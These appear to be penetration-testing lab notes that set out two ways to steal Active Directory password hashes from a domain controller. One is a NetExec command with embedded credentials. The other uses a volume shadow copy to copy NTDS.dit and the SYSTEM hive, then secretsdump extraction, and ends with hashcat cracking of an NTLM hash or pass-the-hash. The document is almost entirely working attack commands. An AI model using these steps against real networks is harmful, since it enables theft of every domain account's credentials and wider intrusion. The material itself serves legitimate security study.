## First Easy Method - NetExec

```shell
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

---
## Second Method
#### Creating shadow copy of C:
```shell
C:\> vssadmin CREATE SHADOW /For=C:
```
#### Copying NTDS.dit from the VSS
```shell
C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
**Note:** As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.
#### Copying SYSTEM Registry Hive
```shell
C:\WINDOWS\system32> reg.exe save hklm\system C:\NTDS\system
```
#### Extracting hashes from NTDS.dit
Transfer file to attack host then:
```shell
secretsdump.py -ntds NTDS.dit -system system LOCAL
```

---
#### Crack Hashes or PtH
```shell
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
